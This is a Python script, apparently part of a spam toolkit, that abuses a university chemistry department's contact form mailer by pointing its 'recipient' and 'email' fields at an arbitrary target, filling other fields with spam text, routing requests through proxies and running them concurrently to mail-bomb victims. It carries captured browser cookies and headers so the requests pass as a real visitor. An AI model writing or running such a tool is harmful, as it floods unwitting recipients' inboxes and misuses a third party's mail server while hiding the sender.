from os.path import basename

import requests

from module import Spam

cookies = {
    '_gcl_au': '1.1.781900007.1677078309',
    '_ga': 'GA1.2.1978893076.1677078311',
    '_gid': 'GA1.2.1997132967.1677078311',
    'ln_or': 'eyIxMDYwOTA2IjoiZCJ9',
    '_fbp': 'fb.1.1677078311823.657039014',
    '_gat_UA-6618139-15': '1',
    '_gat_UA-92150102-3': '1',
    '_gat_UA-92150102-4': '1',
    '_gat': '1',
    '_gat_newTracker1': '1',
    'BE_CLA3': 'p_id%3D2RN8RP2LALL4RP4RRP2JL4NPAAAAAAAAAH%26bf%3Dc653bf44f16718280e223a1516d68c7d%26bn%3D3%26bv%3D3.45%26s_expire%3D1677164859411%26s_id%3D2RN8RP2LALL4RNLJP66JL4NPAAAAAAAAAH',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': '_gcl_au=1.1.781900007.1677078309; _ga=GA1.3.1978893076.1677078311; _gid=GA1.3.1997132967.1677078311; _ga=GA1.2.1978893076.1677078311; _gid=GA1.2.1997132967.1677078311; ln_or=eyIxMDYwOTA2IjoiZCJ9; _fbp=fb.1.1677078311823.657039014; _gat_UA-6618139-15=1; _gat_UA-92150102-3=1; _gat_UA-92150102-4=1; _gat=1; _gat_newTracker1=1; BE_CLA3=p_id%3D2RN8RP2LALL4RP4RRP2JL4NPAAAAAAAAAH%26bf%3Dc653bf44f16718280e223a1516d68c7d%26bn%3D3%26bv%3D3.45%26s_expire%3D1677164859411%26s_id%3D2RN8RP2LALL4RNLJP66JL4NPAAAAAAAAAH',
    'Origin': 'https://chem.siu.edu',
    'Referer': 'https://chem.siu.edu/alumni/contact.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

s = 'Your form has been submitted!'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        data = {
            'recipient': target,
            'formname': text,
            'thankyoupage': 'thankyou.php',
            'fname': text,
            'lname': text,
            'category': 'Select...',
            'phone': text,
            'email': target,
            'street': text,
            'city': text,
            'state': 'AK',
            'zip': text,
            'message': text,
            'validation': 'S@luki',
            'carboncopy': '',
            'submit': 'Submit',
        }

        response = requests.post('https://chem.siu.edu/_common/includes/mailform.php', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
